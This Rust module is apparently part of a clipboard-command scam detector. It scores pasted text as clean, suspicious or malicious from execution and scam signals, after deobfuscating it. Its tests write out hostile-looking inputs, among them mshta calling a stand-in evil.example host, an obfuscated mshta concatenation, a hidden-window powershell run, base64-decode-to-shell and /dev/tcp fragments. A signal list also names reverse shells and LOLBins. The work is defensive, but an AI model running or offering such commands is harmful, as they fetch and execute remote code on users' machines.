//! Verdict for command text (legacy `CommandDetector.Analyze`,
//! docs/spec/detection-rules.md §3.0–3.2, §3.5).
//!
//! Execution signal only → Suspicious (official installers look like this too);
//! execution signal + any strong scam signal → Malicious. Download-and-execute is
//! itself an execution signal, and a strong one unless every source is an
//! official installer host or URL prefix (#20).
//!
//! 1b: every segment is also deobfuscated ([`super::deobfuscate`]) and the peeled
//! text is judged by the same table; the higher level wins and the reasons are
//! merged. Text that went through a built step never qualifies for the official
//! lists, and an execution signal that only appears after an obfuscation step adds
//! the strong signal `cmd-reason-obfuscated`.

use crate::{Level, Message, Verdict};

use super::deobfuscate::{self, RawStep, StepKind};
use super::re::Signal;
use super::{download_exec, normalize, signals};

/// Texts up to this many chars are analyzed as one piece (signals may sit on
/// different lines). Longer texts are analyzed in segments of this length: the
/// first window (covers the first line and Win+R's 259-char limit) plus every
/// later line.
pub const WINDOW_LENGTH: usize = 4096;
/// Lines longer than a window are cut into windows that advance by this much, so a
/// command of up to this many chars is always wholly inside some window.
pub const WINDOW_STEP: usize = WINDOW_LENGTH / 2;
/// Total chars analyzed in segment mode (beyond that nothing is analyzed), so huge
/// clipboards cannot stall the UI.
pub const MAX_SCANNED_CHARS: usize = 256 * 1024;
/// Non-blank lines analyzed in segment mode.
pub const MAX_LINES: usize = 4000;
/// Long texts keep at most this many consecutive whitespace chars per line (must
/// stay above the "30 spaces then #" threshold).
pub const MAX_WHITESPACE_RUN: usize = 64;
/// At most this many download hosts are reported in a finding.
pub const MAX_FINDING_HOSTS: usize = 16;

const REASON_DOWNLOAD_EXEC: &str = "cmd-reason-download-exec";
const REASON_UNOFFICIAL_SOURCE: &str = "cmd-reason-unofficial-source";
const REASON_NET_USE: &str = "cmd-reason-net-use";
/// Strong: an execution signal that only shows after deobfuscation.
pub(crate) const REASON_OBFUSCATED: &str = "cmd-reason-obfuscated";
/// Weak scam signals: official installers also download and iex.
pub(crate) const WEAK: [&str; 2] = ["cmd-reason-download", "cmd-reason-iex"];

const EXECUTION_SIGNALS: [Signal; 26] = [
    (signals::powershell, "cmd-reason-powershell"),
    (signals::mshta_invocation, "cmd-reason-mshta"),
    (signals::cmd, "cmd-reason-cmd"),
    (signals::delayed_expansion, "cmd-reason-delayed-expansion"),
    (signals::certutil, "cmd-reason-certutil"),
    (signals::bitsadmin, "cmd-reason-bitsadmin"),
    (signals::rundll32, "cmd-reason-rundll32"),
    (signals::regsvr32, "cmd-reason-regsvr32"),
    (signals::msiexec, "cmd-reason-msiexec"),
    (signals::conhost, "cmd-reason-conhost"),
    (signals::curl_shell, "cmd-reason-curl-shell"),
    (signals::script_host, "cmd-reason-script-host"),
    (signals::html_help, "cmd-reason-html-help"),
    (signals::cmstp, "cmd-reason-cmstp"),
    (signals::pcalua, "cmd-reason-pcalua"),
    (signals::odbcconf, "cmd-reason-odbcconf"),
    (signals::install_util, "cmd-reason-installutil"),
    (signals::ftp_script, "cmd-reason-ftp-script"),
    (signals::remote_file, "cmd-reason-remote-file"),
    (signals::webdav, "cmd-reason-webdav"),
    (signals::search_ms, "cmd-reason-search-ms"),
    (signals::ms_msdt, "cmd-reason-ms-msdt"),
    // 1b: macOS / Linux
    (signals::osascript, "cmd-reason-osascript"),
    (signals::quarantine, "cmd-reason-quarantine"),
    (signals::decode_shell, "cmd-reason-decode-shell"),
    (signals::dev_tcp, "cmd-reason-dev-tcp"),
];

const SCAM_SIGNALS: [Signal; 13] = [
    (signals::hidden_window, "cmd-reason-hidden-window"),
    (signals::encoded, "cmd-reason-encoded"),
    (signals::iex, "cmd-reason-iex"),
    (signals::download, "cmd-reason-download"),
    (signals::bait_comment, "cmd-reason-bait-comment"),
    (signals::check_mark, "cmd-reason-check-mark"),
    (signals::padding, "cmd-reason-padding"),
    (signals::mshta_remote, "cmd-reason-mshta-remote"),
    // 1b
    (signals::hidden_window_api, "cmd-reason-hidden-window"),
    (signals::decode_shell, "cmd-reason-encoded"),
    (signals::reverse_shell, "cmd-reason-reverse-shell"),
    (signals::background, "cmd-reason-background"),
    (signals::msiexec_quiet, "cmd-reason-msiexec-quiet"),
];

/// Is `id` an execution-signal reason?
pub(crate) fn is_execution_id(id: &str) -> bool {
    id == REASON_DOWNLOAD_EXEC
        || id == REASON_NET_USE
        || EXECUTION_SIGNALS.iter().any(|(_, e)| *e == id)
}

/// Is `id` a strong scam reason?
pub(crate) fn is_strong_id(id: &str) -> bool {
    !is_execution_id(id) && !WEAK.contains(&id)
}

/// Analyzes clipboard text (legacy `CommandDetector.Analyze`, plus the 1b
/// deobfuscation). Same as `analyze_in(text, &Context::default()).verdict`.
pub fn analyze(text: &str) -> Verdict {
    analysis(text, false).verdict
}

/// Everything the analysis found: verdict, deobfuscation steps (only when
/// `collect`), download hosts (only when `collect`), and how many distinct
/// obfuscation step kinds were seen.
#[derive(Debug, Clone, Default)]
pub(crate) struct Analysis {
    pub verdict: Verdict,
    pub steps: Vec<RawStep>,
    pub hosts: Vec<String>,
    pub obfuscation_kinds: Vec<StepKind>,
}

impl Analysis {
    fn merge(&mut self, other: Analysis) {
        if other.verdict.level != Level::None {
            self.verdict.level = self.verdict.level.max(other.verdict.level);
            push_unique(&mut self.verdict.reasons, other.verdict.reasons);
        }
        for s in other.steps {
            if self.steps.len() < deobfuscate::MAX_STEPS {
                self.steps.push(s);
            }
        }
        for h in other.hosts {
            if self.hosts.len() < MAX_FINDING_HOSTS && !self.hosts.contains(&h) {
                self.hosts.push(h);
            }
        }
        for k in other.obfuscation_kinds {
            if !self.obfuscation_kinds.contains(&k) {
                self.obfuscation_kinds.push(k);
            }
        }
    }
}

fn push_unique(into: &mut Vec<Message>, from: Vec<Message>) {
    for r in from {
        if !into.contains(&r) {
            into.push(r);
        }
    }
}

/// Analyzes `text`, segment by segment for long texts (§3.0).
pub(crate) fn analysis(text: &str, collect: bool) -> Analysis {
    if text.trim().is_empty() {
        return Analysis::default();
    }
    if fits_window(text) {
        return analyze_segment(text, collect);
    }
    // Padding is mostly whitespace: shorten long runs first so spaces cannot push
    // a command out of the analyzed range (#19).
    let text = collapse_long_whitespace(text);
    if fits_window(&text) {
        return analyze_segment(&text, collect);
    }
    let mut all = Analysis::default();
    for segment in segments(&text) {
        all.merge(analyze_segment(segment, collect));
    }
    all
}

fn fits_window(text: &str) -> bool {
    text.chars().nth(WINDOW_LENGTH).is_none()
}

/// Shortens every run of more than [`MAX_WHITESPACE_RUN`] whitespace chars within
/// a line to exactly that many spaces (every non-newline whitespace becomes a
/// space); newlines are kept. One pass, O(n).
pub(crate) fn collapse_long_whitespace(text: &str) -> String {
    let mut out = String::with_capacity(text.len().min(1 << 20));
    let mut run = 0usize;
    for c in text.chars() {
        if c != '\r' && c != '\n' && c.is_whitespace() {
            run += 1;
            if run <= MAX_WHITESPACE_RUN {
                out.push(' ');
            }
            continue;
        }
        run = 0;
        out.push(c);
    }
    out
}

/// Byte offset `n` chars after the start of `s` (or `s.len()`).
fn advance(s: &str, n: usize) -> usize {
    s.char_indices().nth(n).map_or(s.len(), |(i, _)| i)
}

/// Segments of a long text: the first window, then every line not wholly inside
/// it. Lines longer than a window become overlapping windows advancing by
/// [`WINDOW_STEP`]. Bounded by [`MAX_SCANNED_CHARS`] and [`MAX_LINES`].
pub(crate) fn segments(text: &str) -> Vec<&str> {
    let mut out = vec![&text[..advance(text, WINDOW_LENGTH)]];
    let mut scanned = WINDOW_LENGTH;
    let mut lines = 0usize;
    let mut start_b = 0usize;
    let mut start_c = 0usize;
    while start_b < text.len() && scanned < MAX_SCANNED_CHARS && lines < MAX_LINES {
        let rest = &text[start_b..];
        let end_b = rest.find('\n').map_or(text.len(), |i| start_b + i);
        let line = &text[start_b..end_b];
        let end_c = start_c + line.chars().count();
        if end_c > WINDOW_LENGTH && !line.trim().is_empty() {
            lines += 1;
            let mut chunk_b = start_b;
            let mut chunk_c = start_c;
            while chunk_c < end_c && scanned < MAX_SCANNED_CHARS {
                let length = (end_c - chunk_c).min(WINDOW_LENGTH);
                let chunk = &text[chunk_b..end_b];
                if chunk_c + length > WINDOW_LENGTH {
                    scanned += length;
                    out.push(&chunk[..advance(chunk, length)]);
                }
                if chunk_c + length >= end_c {
                    break;
                }
                chunk_b += advance(chunk, WINDOW_STEP);
                chunk_c += WINDOW_STEP;
            }
        }
        start_b = end_b + 1;
        start_c = end_c + 1;
    }
    out
}

fn matches(rules: &[Signal], text: &str) -> Vec<Message> {
    let mut out: Vec<Message> = Vec::new();
    for (re, id) in rules {
        if re().is_match(text) && !out.iter().any(|m| m.id == *id) {
            out.push(Message::new(id));
        }
    }
    out
}

/// The decision table (§3.2) on normalized text. `allow_official`: the official
/// installer lists may lower download-and-execute to Suspicious.
fn evaluate(text: &str, allow_official: bool) -> Verdict {
    let mut execution = matches(&EXECUTION_SIGNALS, text);
    if signals::net_use_then_run(text) {
        execution.push(Message::new(REASON_NET_USE));
    }
    // Download-and-execute is an execution signal by itself: `irm get.scoop.sh | iex`
    // names no program but runs when pasted into PowerShell.
    let download_exec = download_exec::is_match(text);
    if download_exec {
        execution.push(Message::new(REASON_DOWNLOAD_EXEC));
    }
    if execution.is_empty() {
        return Verdict::CLEAN;
    }

    let mut scam = matches(&SCAM_SIGNALS, text);
    if download_exec && !(allow_official && download_exec::is_from_official_source(text)) {
        scam.push(Message::new(REASON_UNOFFICIAL_SOURCE));
    }
    let strong = scam.iter().any(|m| !WEAK.contains(&m.id.as_ref()));
    let level = if strong {
        Level::Malicious
    } else {
        Level::Suspicious
    };
    push_unique(&mut execution, scam);
    Verdict {
        level,
        reasons: execution,
    }
}

fn execution_ids(v: &Verdict) -> impl Iterator<Item = &str> {
    v.reasons
        .iter()
        .map(|m| m.id.as_ref())
        .filter(|id| is_execution_id(id))
}

fn analyze_segment(raw: &str, collect: bool) -> Analysis {
    let run = deobfuscate::run(raw);
    // Layer 0 of the run is exactly the legacy normalization (unless a size cap
    // stopped it).
    let normalized = run.normalized.clone().unwrap_or_else(|| normalize(raw));
    let mut verdict = evaluate(&normalized, true);
    let mut hosts = if collect {
        download_exec::hosts(&normalized)
    } else {
        Vec::new()
    };

    if run.output != run.plain {
        let deob = evaluate(&run.output, !run.built);
        let mut hidden: Vec<&str> = execution_ids(&deob)
            .filter(|id| !execution_ids(&verdict).any(|b| b == *id))
            .collect();
        if run.obfuscated && !hidden.is_empty() && run.plain != normalized {
            // Markdown markers alone do not hide anything.
            let plain = evaluate(&run.plain, true);
            hidden.retain(|id| !execution_ids(&plain).any(|b| b == *id));
        }
        let obfuscated = run.obfuscated && !hidden.is_empty();
        if deob.level != Level::None {
            verdict.level = verdict.level.max(deob.level);
            push_unique(&mut verdict.reasons, deob.reasons);
        }
        if obfuscated {
            verdict.level = Level::Malicious;
            push_unique(&mut verdict.reasons, vec![Message::new(REASON_OBFUSCATED)]);
        }
        if collect {
            for h in download_exec::hosts(&run.output) {
                if !hosts.contains(&h) {
                    hosts.push(h);
                }
            }
        }
    }
    hosts.truncate(MAX_FINDING_HOSTS);
    let mut obfuscation_kinds: Vec<StepKind> = Vec::new();
    for s in &run.steps {
        if s.kind.is_obfuscation() && !obfuscation_kinds.contains(&s.kind) {
            obfuscation_kinds.push(s.kind);
        }
    }
    Analysis {
        verdict,
        steps: if collect { run.steps } else { Vec::new() },
        hosts,
        obfuscation_kinds,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn collapse_keeps_newlines_and_short_runs() {
        let input = format!("a{}#\n{}b", " ".repeat(5000), " ".repeat(10));
        let expected = format!("a{}#\n{}b", " ".repeat(64), " ".repeat(10));
        assert_eq!(collapse_long_whitespace(&input), expected);
    }

    #[test]
    fn segments_cover_long_lines_with_overlap() {
        let line = "a".repeat(10_000);
        let segs = segments(&line);
        // first window + windows starting at 2048, 4096, 6144 (the last reaches the end)
        assert_eq!(segs.len(), 4);
        assert!(segs.iter().all(|s| s.len() <= WINDOW_LENGTH));
    }

    #[test]
    fn segments_are_bounded() {
        let text = "x\n".repeat(1_000_000);
        let segs = segments(&text);
        assert!(segs.len() <= MAX_LINES + 1);
    }

    #[test]
    fn verdict_levels() {
        assert_eq!(analyze("").level, Level::None);
        assert_eq!(analyze("I use powershell every day").level, Level::None);
        assert_eq!(analyze("cmd /c dir").level, Level::Suspicious);
        let bad = ["power", "shell -w hidden -c calc"].concat();
        assert_eq!(analyze(&bad).level, Level::Malicious);
    }

    /// Legacy property "超大剪貼簿不會卡住" (CommandBypassTests and
    /// CommandDownloadLolbinTests): analyze + explain on each input < 3 s. The
    /// timing is only asserted in optimized builds.
    #[test]
    fn huge_clipboards_do_not_stall() {
        let inputs = [
            " ".repeat(2_000_000),
            "\n".repeat(2_000_000),
            "certutil ".repeat(200_000),
            "rundll32 # ".repeat(200_000),
            "a".repeat(2_000_000),
            format!("{}x\n", " ".repeat(4000)).repeat(500),
            r"net use z: \\a\b ".repeat(100_000),
            r"\\a\b\".repeat(300_000),
            r"start \\a\".repeat(200_000),
            "irm x | ".repeat(200_000),
            "iex $".repeat(200_000),
            "search-ms:".repeat(200_000),
            "wscript /a ".repeat(200_000),
            // Non-ASCII text keeps the lazy DFA from handling Unicode word boundaries.
            "中".repeat(1_000_000),
            "認証 # rob\u{e9} powershell iex ".repeat(100_000),
        ];
        for input in &inputs {
            let start = std::time::Instant::now();
            let _ = analyze(input);
            let _ = super::super::explain(input);
            let elapsed = start.elapsed();
            if !cfg!(debug_assertions) {
                assert!(
                    elapsed.as_millis() < 3000,
                    "{:?}… took {elapsed:?}",
                    input.chars().take(20).collect::<String>()
                );
            }
        }
    }

    #[test]
    fn command_after_long_padding_is_found() {
        let text = format!(
            "{}\n{}",
            "x".repeat(5000),
            ["ms", "hta https://evil.example/a"].concat()
        );
        assert_eq!(analyze(&text).level, Level::Malicious);
    }

    /// Release budget for one 1 Mi-char pathological input (phase-1.md §1.6:
    /// 150 ms; CI fails at twice the budget).
    const BUDGET_MS: u128 = 150;

    /// 1b: pathological inputs for every deobfuscation layer and new signal. Each
    /// is about 1 Mi chars; `analyze_in` (with trace and masking) must stay within
    /// twice the budget in optimized builds.
    #[test]
    fn deobfuscation_inputs_meet_budget() {
        const N: usize = 1 << 20;
        let fill = |unit: &str| {
            let mut s = unit.repeat(N / unit.chars().count().max(1) + 1);
            let cut = s.char_indices().nth(N).map_or(s.len(), |(i, _)| i);
            s.truncate(cut);
            s
        };
        let inputs = [
            fill("'a'+"),
            fill("'a'+'b' "),
            fill("[char]65+"),
            fill("[char[]](65,66) "),
            fill("-join ('a','b') "),
            fill("('a','b') -join '' "),
            fill("'{0}{1}' -f 'a','b' "),
            fill("'ab' -replace 'a','b' "),
            fill("'ab'.Replace('a','b') "),
            fill("[string]::Concat('a','b') "),
            fill("& ('a') "),
            fill("(('a')) "),
            fill("$a='x'; $a "),
            format!("set x=abcdef&{}", fill("%x:~1,2%")),
            format!("set x=abcdef&{}", fill("!x:b=c!")),
            fill("`a"),
            fill("``a`"),
            fill("```\n"),
            fill("%41%42%43 "),
            fill("\\x41\\x42\\x43 "),
            fill("41"),
            fill("\u{FF41}"),
            fill("x -enc QQBBAEEAQQBBAEEAQQBBAA== "),
            fill("echo QUFBQUFBQUFBQUFBQUFBQQ== | base64 -d | sh\n"),
            fill("b64decode('QUFBQUFBQUFBQUFBQUFBQQ==') "),
            fill(
                "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QUFBQUFBQUFBQUFB')) ",
            ),
            fill("curl -o a x; ./a; "),
            fill("python3 -c exec(urlopen( "),
            fill("bash -c \"$(curl "),
            fill("xattr -c "),
            fill("nohup /dev/tcp/a/1 "),
            fill("osascript -e "),
            fill("https://raw.githubusercontent.com/Homebrew/install/a "),
        ];
        let ctx = crate::Context::default();
        for input in &inputs {
            let start = std::time::Instant::now();
            let f = super::super::analyze_in(input, &ctx);
            let elapsed = start.elapsed();
            assert!(f.trace.len() <= deobfuscate::MAX_STEPS);
            if !cfg!(debug_assertions) {
                assert!(
                    elapsed.as_millis() < crate::text::perf_budget_ms(2 * BUDGET_MS),
                    "{:?}… took {elapsed:?}",
                    input.chars().take(24).collect::<String>()
                );
            }
        }
    }

    #[test]
    fn deobfuscated_payloads_escalate() {
        // `& ('ms'+'hta') https://…`: legacy None; the peeled text runs mshta on a
        // remote URL.
        let concat = ["& ('m", "s'+'hta') https://evil.example.invalid/a"].concat();
        assert_eq!(analyze(&concat).level, Level::Malicious);
        // Markdown fences around an official installer stay Suspicious.
        let md = "```sh\ncurl -fsSL https://bun.sh/install | bash\n```\nthen `bun upgrade`";
        assert_eq!(analyze(md).level, Level::Suspicious);
    }
}
